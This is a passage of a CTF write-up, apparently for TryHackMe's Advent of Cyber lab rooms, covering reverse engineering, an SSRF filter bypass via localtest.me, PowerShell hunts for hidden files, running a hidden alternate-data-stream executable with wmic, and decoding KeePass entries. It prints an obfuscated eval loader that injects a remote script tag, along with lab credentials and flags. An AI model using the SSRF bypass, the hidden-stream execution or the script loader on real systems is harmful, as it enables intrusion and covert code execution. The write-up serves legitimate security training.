terminates:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"[Inferior 1 (process 9100) exited normally]\n")),(0,i.kt)("p",null,"Overall, we were able to answer all the questions."),(0,i.kt)("h4",{id:"what-is-the-value-of-local_ch-when-its-corresponding-movl-instruction-is-called-first-if-multiple"},"What is the value of local_ch when its corresponding movl instruction is called (first if multiple)?"),(0,i.kt)("p",null,"The value of ",(0,i.kt)("inlineCode",{parentName:"p"},"local_ch")," was ",(0,i.kt)("inlineCode",{parentName:"p"},"0x00000001")," which is hexadecimal for ",(0,i.kt)("inlineCode",{parentName:"p"},"1"),"."),(0,i.kt)("h4",{id:"what-is-the-value-of-eax-when-the-imull-instruction-is-called"},"What is the value of eax when the imull instruction is called?"),(0,i.kt)("p",null,"The value of ",(0,i.kt)("inlineCode",{parentName:"p"},"eax")," was ",(0,i.kt)("inlineCode",{parentName:"p"},"0x6")," which is hexadecimal for ",(0,i.kt)("inlineCode",{parentName:"p"},"6"),"."),(0,i.kt)("h4",{id:"what-is-the-value-of-local_4h-before-eax-is-set-to-0"},"What is the value of local_4h before eax is set to 0?"),(0,i.kt)("p",null,"The value of ",(0,i.kt)("inlineCode",{parentName:"p"},"local_4h")," was ",(0,i.kt)("inlineCode",{parentName:"p"},"0x00000006")," which is hexadecimal for ",(0,i.kt)("inlineCode",{parentName:"p"},"6"),"."),(0,i.kt)("h3",{id:"side-note"},"Side note"),(0,i.kt)("p",null,"Since this was a relatively simple binary we could have gotten the answers just by reading the assembly code."),(0,i.kt)("p",null,"Here, we see the value ",(0,i.kt)("inlineCode",{parentName:"p"},"0x1")," being put into ",(0,i.kt)("inlineCode",{parentName:"p"},"rbp-0xc"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"0x0000000000400b51 <+4>:     mov    DWORD PTR [rbp-0xc],0x1\n")),(0,i.kt)("p",null,"Next we see the value ",(0,i.kt)("inlineCode",{parentName:"p"},"0x6")," being put into ",(0,i.kt)("inlineCode",{parentName:"p"},"rbp-0x8")," which is later put into ",(0,i.kt)("inlineCode",{parentName:"p"},"eax"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"0x0000000000400b58 <+11>:    mov    DWORD PTR [rbp-0x8],0x6\n0x0000000000400b62 <+21>:    imul   eax,DWORD PTR [rbp-0x8]\n")),(0,i.kt)("p",null,"Lastly, we see the value of ",(0,i.kt)("inlineCode",{parentName:"p"},"eax")," (which is ",(0,i.kt)("inlineCode",{parentName:"p"},"0x6"),") being put into ",(0,i.kt)("inlineCode",{parentName:"p"},"rbp-0x4"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"0x0000000000400b66 <+25>:    mov    DWORD PTR [rbp-0x4],eax\n")),(0,i.kt)("h2",{id:"day-18-the-bits-of-the-christmas"},"Day 18: The Bits of the Christmas"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Reverse Engineering"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: GDB, Linux")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Continuing from yesterday, practice your reverse engineering.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.120.124")),(0,i.kt)("h3",{id:"connecting-to-the-windows-machine-using-rdp"},"Connecting to the Windows Machine using RDP"),(0,i.kt)("p",null,"I used Microsoft Remote Desktop for macOS to connect to the target machine. I logged in with the credentials ",(0,i.kt)("inlineCode",{parentName:"p"},"cmnatic:Adventofcyber!"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"# By the way, here is the command to forward a port the target machine through a virtual machine to the host machine.\nssh -L 3389:IP_OF_TARGET_MACHINE:3389 IP_OF_VIRTUAL_MACHINE\n")),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(76792).Z,width:"1919",height:"1012"})),(0,i.kt)("h3",{id:"getting-santas-password-and-the-flag"},"Getting Santa's password and the flag!"),(0,i.kt)("p",null,"Next, we can open up the binary in ILSpy. After poking around, I found the following:"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(56041).Z,width:"1420",height:"788"})),(0,i.kt)("p",null,"We can see the santa's password is ",(0,i.kt)("inlineCode",{parentName:"p"},"santapassword321"),"."),(0,i.kt)("h3",{id:"although-technically-the-flags-in-the-previous-screenshot"},"Although technically the flag's in the previous screenshot..."),(0,i.kt)("p",null,"I still wanted to run the executable application. So I opened it up and enter the password we found."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(2383).Z,width:"446",height:"534"})),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"thm{046af}")),(0,i.kt)("h2",{id:"day-19-the-naughty-or-nice-list"},"Day 19: The Naughty or Nice List"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Special"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Web, SSRF"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Special Contributer: Tib3rius"),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Santa has released a web app that lets the children of the world check whether they are currently on the naughty or nice list. Unfortunately the elf who coded it exposed more things than she thought. Can you access the list administration and ensure that every child gets a present from Santa this year?")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.219.138")),(0,i.kt)("h3",{id:"finding-the-vulnerability"},"Finding the vulnerability"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(18470).Z,width:"1848",height:"950"})),(0,i.kt)("p",null,"Turns out, this page is vulnerable to Server Side Request Forgery."),(0,i.kt)("p",null,"After searching for a name, we are redirected to a link similar to ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.219.138/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dbluemoon"),"."),(0,i.kt)("p",null,"If we URL Decode the proxy parameter we get ",(0,i.kt)("inlineCode",{parentName:"p"},"http://list.hohoho:8080/search.php?name=bluemoon")),(0,i.kt)("p",null,"So this kinda looks like a URL. However list.hohoho is not a valid URL. This must be the hostname of some backend machine. Let's try poking around. If try to visit ",(0,i.kt)("inlineCode",{parentName:"p"},"http://list.hohoho:80")," by accessing ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.219.138/?proxy=http%3A%2F%2Flist.hohoho%3A80"),", we get ",(0,i.kt)("inlineCode",{parentName:"p"},"Failed to connect to list.hohoho port 80: Connection refused"),". Looks like port 80 is closed. If we try to visit the SSH port using the same technique by visiting ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.219.138/?proxy=http%3A%2F%2Flist.hohoho%3A22")," we get ",(0,i.kt)("inlineCode",{parentName:"p"},"Recv failure: Connection reset by peer")," which means that the SSH port is open but failed to connect since we are sending an HTTP request to the SSH port which surprisingly and unfortunately does not work."),(0,i.kt)("p",null,"So next, let's check out what's running on the machine's localhost by visiting ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.219.138/?proxy=http%3A%2F%2Flocalhost"),'. Unfortunately, it their "security team" blocked our attempt with the message ',(0,i.kt)("inlineCode",{parentName:"p"},"Your search has been blocked by our security team."),"."),(0,i.kt)("p",null,'But can we circumvent this? It turns out we can! The "security team" only ensures that the hostname starts with ',(0,i.kt)("inlineCode",{parentName:"p"},"list.hohoho"),". However, we can find a domain that resolves itself and every subdomain to ",(0,i.kt)("inlineCode",{parentName:"p"},"127.0.0.1")," (localhost). It turns out ",(0,i.kt)("inlineCode",{parentName:"p"},"localtest.me")," resolves every subdomain to ",(0,i.kt)("inlineCode",{parentName:"p"},"127.0.0.1"),". So, we can access the site on ",(0,i.kt)("inlineCode",{parentName:"p"},"localhost:80")," by visiting ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.219.138/?proxy=http%3A%2F%2Flist.hohoho.localtest.me"),"."),(0,i.kt)("p",null,"Oh and by the way, here is the DNS lookup for ",(0,i.kt)("inlineCode",{parentName:"p"},"localtest.me"),":"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day19-the-naughty-or-nice-list$ nslookup localtest.me\nServer:         127.0.0.53\nAddress:        127.0.0.53#53\n\nNon-authoritative answer:\nName:   localtest.me\nAddress: 127.0.0.1\n")),(0,i.kt)("p",null,"We also found a message from Elf McSkidy!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Santa,\n\nIf you need to make any changes to the Naughty or Nice list, you need to login.\n\nI know you have trouble remembering your password so here it is: Be good for goodness sake!\n\n- Elf McSkidy \n")),(0,i.kt)("p",null,"So it turns out Santa's password is: ",(0,i.kt)("inlineCode",{parentName:"p"},"Be good for goodness sake!"),(0,i.kt)("br",{parentName:"p"}),"\n","We can also guess that his username is either ",(0,i.kt)("inlineCode",{parentName:"p"},"admin"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"santa")," or something like that. It turns out it was ",(0,i.kt)("inlineCode",{parentName:"p"},"Santa"),"."),(0,i.kt)("h3",{id:"getting-the-flag-6"},"Getting the flag"),(0,i.kt)("p",null,"Now, we can log in with Santa's credentials and we are greeted with an admin panel."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(3930).Z,width:"878",height:"154"})),(0,i.kt)("p",null,"If we click the ",(0,i.kt)("inlineCode",{parentName:"p"},"DELETE NAUGHTY LIST")," button, we get the flag in a JavaScript alert!"),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{EVERYONE_GETS_PRESENTS}")),(0,i.kt)("h2",{id:"day-20-powershellf-to-the-rescue"},"Day 20: PowershELlF to the rescue"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Blue Teaming"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Powershell")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Understand how to use PowerShell to find all that was removed from the stockings that were hidden throughout the endpoint.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.90.95")),(0,i.kt)("h3",{id:"connecting-via-ssh-1"},"Connecting via SSH"),(0,i.kt)("p",null,"We are given the credentials ",(0,i.kt)("inlineCode",{parentName:"p"},"mceager:r0ckStar!")),(0,i.kt)("p",null,"We run SSH with the following command:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"ssh mceager@10.10.90.95\n")),(0,i.kt)("p",null,"We are then greeted with a Windows Command prompt which we can make a Powershell prompt!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Microsoft Windows [Version 10.0.17763.737]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nmceager@ELFSTATION1 C:\\Users\\mceager>powershell\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved. \n\nPS C:\\Users\\mceager> \n")),(0,i.kt)("h3",{id:"getting-started-in-powershell"},"Getting started in PowerShell"),(0,i.kt)("p",null,"Being a macOS and Linux user all my life (well, I have and still use Windows just not for coding), I am very unfamiliar with the Command Prompt and Powershell."),(0,i.kt)("p",null,"First we change to the Documents folder."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\mceager> Set-Location Documents \nPS C:\\Users\\mceager\\Documents>\n")),(0,i.kt)("p",null,"We can then do a quick directory listing."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\mceager\\Documents> Get-ChildItem -File -Hidden\n\n\n    Directory: C:\\Users\\mceager\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a-hs-        12/7/2020  10:29 AM            402 desktop.ini\n-arh--       11/18/2020   5:05 PM             35 e1fone.txt\n")),(0,i.kt)("p",null,"Note, I will be using some Linux aliases throughout since PS cmdlets are too verbose and I'm lazy and not used to them."),(0,i.kt)("h3",{id:"search-for-the-first-hidden-elf-file-within-the-documents-folder-read-the-contents-of-this-file-what-does-elf-1-want"},"Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?"),(0,i.kt)("p",null,"We can get the contents from the ",(0,i.kt)("inlineCode",{parentName:"p"},"e1fone.txt")," file."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\mceager\\Documents> cat e1fone.txt\nAll I want is my '2 front teeth'!!!\n")),(0,i.kt)("h3",{id:"search-on-the-desktop-for-a-hidden-folder-that-contains-the-file-for-elf-2-read-the-contents-of-this-file-what-is-the-name-of-that-movie-that-elf-2-wants"},"Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?"),(0,i.kt)("p",null,"First, we change to the Desktop folder."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\mceager\\Documents> cd ../Desktop\n")),(0,i.kt)("p",null,"We see an ",(0,i.kt)("inlineCode",{parentName:"p"},"elf2wo")," directory so let's explore."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\mceager\\Desktop> ls -Hidden\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd--h--        12/7/2020  11:26 AM                elf2wo\n-a-hs-        12/7/2020  10:29 AM            282 desktop.ini\n\nPS C:\\Users\\mceager\\Desktop> cd elf2wo\nPS C:\\Users\\mceager\\Desktop\\elf2wo> ls \n\n\n    Directory: C:\\Users\\mceager\\Desktop\\elf2wo\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       11/17/2020  10:26 AM             64 e70smsW10Y4k.txt\n\nPS C:\\Users\\mceager\\Desktop\\elf2wo> cat e70smsW10Y4k.txt\nI want the movie Scrooged <3!\n")),(0,i.kt)("h3",{id:"search-the-windows-directory-for-a-hidden-folder-that-contains-files-for-elf-3-what-is-the-name-of-the-hidden-folder"},"Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder?"),(0,i.kt)("p",null,"We can run the following cmdlet to find the hidden folder for Elf 3."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\> ls -Recurse -Path C:\\Windows -Filter '*3*' -Directory -Hidden -ErrorAction SilentlyContinue\n\n\n    Directory: C:\\Windows\\System32\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd--h--       11/23/2020   3:26 PM                3lfthr3e\n")),(0,i.kt)("p",null,"We can then change into that directory."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\> cd C:/Windows/System32/3lfthr3e\n")),(0,i.kt)("h3",{id:"how-many-words-does-the-first-file-contain"},"How many words does the first file contain?"),(0,i.kt)("p",null,"We can pipe the output of ",(0,i.kt)("inlineCode",{parentName:"p"},"Get-Content")," into ",(0,i.kt)("inlineCode",{parentName:"p"},"Measure-Object -Word")," to get a word count."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Windows\\System32\\3lfthr3e> cat 1.txt | Measure-Object -Word\n\nLines Words Characters Property \n----- ----- ---------- --------\n       9999\n")),(0,i.kt)("h3",{id:"what-2-words-are-at-index-551-and-6991-in-the-first-file"},"What 2 words are at index 551 and 6991 in the first file?"),(0,i.kt)("p",null,"We can use square brackets to index the output."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Windows\\System32\\3lfthr3e> (cat 1.txt)[551]\nRed\nPS C:\\Windows\\System32\\3lfthr3e> (cat 1.txt)[6991]\nRyder\n")),(0,i.kt)("h3",{id:"search-in-the-2nd-file-for-the-phrase-from-the-previous-question-to-get-the-full-answer-what-does-elf-3-want"},"Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?"),(0,i.kt)("p",null,"We can search inside a file with a pattern as follows:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'PS C:\\Windows\\System32\\3lfthr3e> Select-String 2.txt -Pattern "redryder*" \n\n2.txt:558704:redryderbbgun\n')),(0,i.kt)("h2",{id:"day-21-time-for-some-elforensics"},"Day 21: Time for some ELForensics"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Blue Teaming"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Forensics")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Understand how to use PowerForensics to find clues as to where the naughty list was hidden.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.154.191")),(0,i.kt)("h3",{id:"connecting-via-rdp"},"Connecting via RDP"),(0,i.kt)("p",null,"We are given credentials ",(0,i.kt)("inlineCode",{parentName:"p"},"littlehelper:iLove5now!")," to connect to the Windows machine using RDP."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(25979).Z,width:"603",height:"313"})),(0,i.kt)("p",null,"And we land into a Windows desktop!"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(9106).Z,width:"1600",height:"900"})),(0,i.kt)("h3",{id:"getting-started-1"},"Getting started"),(0,i.kt)("p",null,"First we open up Powershell (which is conviniently already in the TaskBar) and enter the Documents directory."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\littlehelper> cd Documents\nPS C:\\Users\\littlehelper\\Documents>\n")),(0,i.kt)("h3",{id:"contents-of-the-db-file-hashtxt-file"},'Contents of the "',(0,i.kt)("inlineCode",{parentName:"h3"},"db file hash.txt"),'" file.'),(0,i.kt)("p",null,"We can use the ",(0,i.kt)("inlineCode",{parentName:"p"},"Get-Content")," cmdlet or the ",(0,i.kt)("inlineCode",{parentName:"p"},"gc"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"cat")," or ",(0,i.kt)("inlineCode",{parentName:"p"},"type")," aliases to get the contents of the text file."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'PS C:\\Users\\littlehelper\\Documents> cat "db file hash.txt"\nFilename:       db.exe\nMD5 Hash:       596690FFC54AB6101932856E6A78E3A1\n')),(0,i.kt)("h3",{id:"getting-the-hash-of-deebeeexe"},"Getting the hash of ",(0,i.kt)("inlineCode",{parentName:"h3"},"deebee.exe")),(0,i.kt)("p",null,"We can use the ",(0,i.kt)("inlineCode",{parentName:"p"},"Get-FileHash")," cmdlet to get the MD5 hash of ",(0,i.kt)("inlineCode",{parentName:"p"},"deebee.exe"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\littlehelper\\Documents> Get-FileHash -Algorithm MD5 deebee.exe\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nMD5             5F037501FB542AD2D9B06EB12AED09F0                                       C:\\Users\\littlehelper\\Documents\\deebee.exe\n")),(0,i.kt)("h3",{id:"getting-the-flag-7"},"Getting the flag!"),(0,i.kt)("p",null,"We can use ",(0,i.kt)("inlineCode",{parentName:"p"},"C:\\Tools\\strings64.exe")," (similar to the strings command on Linux) to find all the strings in a binary file. Then we pipe it into the ",(0,i.kt)("inlineCode",{parentName:"p"},"Select-String")," cmdlet (which will work similar to grep in Linux) with a pattern."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'PS C:\\Users\\littlehelper\\Documents> /Tools/strings64.exe -nobanner deebee.exe | Select-String -Pattern "THM{*"\n\nTHM{f6187e6cbeb1214139ef313e108cb6f9}\n')),(0,i.kt)("p",null,"Flag 1: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{f6187e6cbeb1214139ef313e108cb6f9}")),(0,i.kt)("h3",{id:"running-the-real-database-connector-and-getting-another-flag"},"Running the real database connector and getting another flag!"),(0,i.kt)("p",null,"We can look at the executable for Alternate Data Streams."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\littlehelper\\Documents> Get-Item deebee.exe -Stream *\n\n\nPSPath        : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents\\deebee.exe::$DATA\nPSParentPath  : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents\nPSChildName   : deebee.exe::$DATA\nPSDrive       : C\nPSProvider    : Microsoft.PowerShell.Core\\FileSystem\nPSIsContainer : False\nFileName      : C:\\Users\\littlehelper\\Documents\\deebee.exe\nStream        : :$DATA\nLength        : 5632\n\nPSPath        : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents\\deebee.exe:hidedb\nPSParentPath  : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents\nPSChildName   : deebee.exe:hidedb\nPSDrive       : C\nPSProvider    : Microsoft.PowerShell.Core\\FileSystem\nPSIsContainer : False\nFileName      : C:\\Users\\littlehelper\\Documents\\deebee.exe\nStream        : hidedb\nLength        : 6144\n")),(0,i.kt)("p",null,"We can then run hidden executable."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PS C:\\Users\\littlehelper\\Documents> wmic process call create $(Resolve-Path .\\deebee.exe:hidedb)\nExecuting (Win32_Process)->Create()\nMethod execution successful.\nOut Parameters:\ninstance of __PARAMETERS\n{\n        ProcessId = 172;\n        ReturnValue = 0;\n};\n")),(0,i.kt)("p",null,"And then we get our final flag!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Choose an option:\n1) Nice List\n2) Naughty List\n3) Exit\n\nTHM{088731ddc7b9fdeccaed982b07c297c}\n\nSelect an option:\n")),(0,i.kt)("p",null,"Flag 2: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{088731ddc7b9fdeccaed982b07c297c}")),(0,i.kt)("h2",{id:"day-22-elf-mceager-becomes-cyberelf"},"Day 22: Elf McEager becomes CyberElf"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Blue Teaming"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Cyberchef, Encoding")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"You have found where the naughty list has been hidden online but it's encoded. Learn how to decode the contents of this file using CyberChef.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.195.171")),(0,i.kt)("h3",{id:"logging-in"},"Logging in"),(0,i.kt)("p",null,"Once again, we can use Microsoft RDP to log in. Once logged in, we find a folder with the name ",(0,i.kt)("inlineCode",{parentName:"p"},"dGhlZ3JpbmNod2FzaGVyZQ=="),". It kinda looks like base64, so i decide to base 64 decode it."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'bluemoon@dragonfly:~/ctf/thm/thm-advent/day22-elf-mceager-becomes-cyberelf$ echo "dGhlZ3JpbmNod2FzaGVyZQ==" | base64 -d\nthegrinchwashere\n')),(0,i.kt)("p",null,"Ahh, big yikes..."),(0,i.kt)("h3",{id:"opening-keypass"},"Opening keypass"),(0,i.kt)("p",null,"If we open keypass, we find out that it is locked with a master password. We can try to use ",(0,i.kt)("inlineCode",{parentName:"p"},"thegrinchwashere")," as the password and sure enough, it works!"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(89649).Z,width:"1132",height:"639"})),(0,i.kt)("h3",{id:"getting-the-passwords"},"Getting the passwords"),(0,i.kt)("p",null,"I will be using CyberChef to decode most if not all of these.  "),(0,i.kt)("p",null,"The password for the Elf Server is ",(0,i.kt)("inlineCode",{parentName:"p"},"736e30774d346e21")," which we can decode using hex to find ",(0,i.kt)("inlineCode",{parentName:"p"},"sn0wM4n!"),"  "),(0,i.kt)("p",null,"The password for the ElfMail is ",(0,i.kt)("inlineCode",{parentName:"p"},"&#105;&#99;&#51;&#83;&#107;&#97;&#116;&#105;&#110;&#103;&excl;")," which we can decode using HTML Entity to find ",(0,i.kt)("inlineCode",{parentName:"p"},"ic3Skating!")),(0,i.kt)("h3",{id:"getting-the-flag-8"},"Getting the flag"),(0,i.kt)("p",null,"If we look at the notes for the Elf Security System. It looks like obfuscated JavaScript code."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"eval(String.fromCharCode(118, 97, 114, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 54, 44, 32, 49, 48, 52, 44, 32, 49, 49, 55, 44, 32, 57, 56, 44, 32, 52, 54, 44, 32, 57, 57, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 52, 55, 44, 32, 49, 48, 52, 44, 32, 49, 48, 49, 44, 32, 57, 55, 44, 32, 49, 49, 56, 44, 32, 49, 48, 49, 44, 32, 49, 49, 48, 44, 32, 49, 49, 52, 44, 32, 57, 55, 44, 32, 49, 48, 53, 44, 32, 49, 50, 50, 44, 32, 57, 55, 44, 32, 52, 55, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 52, 57, 44, 32, 52, 57, 44, 32, 49, 48, 48, 44, 32, 53, 49, 44, 32, 53, 48, 44, 32, 52, 57, 44, 32, 53, 48, 44, 32, 53, 50, 44, 32, 53, 50, 44, 32, 57, 57, 44, 32, 53, 50, 44, 32, 49, 48, 48, 44, 32, 53, 52, 44, 32, 53, 52, 44, 32, 53, 53, 44, 32, 53, 50, 44, 32, 53, 50, 44, 32, 53, 52, 44, 32, 49, 48, 48, 44, 32, 57, 56, 44, 32, 49, 48, 50, 44, 32, 49, 48, 48, 44, 32, 53, 55, 44, 32, 57, 55, 44, 32, 53, 49, 44, 32, 53, 48, 44, 32, 53, 55, 44, 32, 53, 54, 44, 32, 57, 55, 44, 32, 53, 54, 44, 32, 53, 54, 44, 32, 57, 56, 44, 32, 53, 54, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125));\n")),(0,i.kt)("p",null,"If we run it in the browser console, we get the following:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<script type=\u200b"text/\u200bjavascript" async src=\u200b"hhttps:\u200b/\u200b/\u200bgist.github.com/\u200bheavenraiza/\u200b">\u200b<\/script>\u200b\n')),(0,i.kt)("p",null,"Looks like they made a typo, but if we go to ",(0,i.kt)("inlineCode",{parentName:"p"},"https:\u200b/\u200b/\u200bgist.github.com/\u200bheavenraiza/"),", we can find the final flag!"),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{657012dcf3d1318dca0ed864f0e70535}")),(0,i.kt)("h2",{id:"day-23-the-grinch-strikes-again"},"Day 23: The Grinch strikes again"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Blue 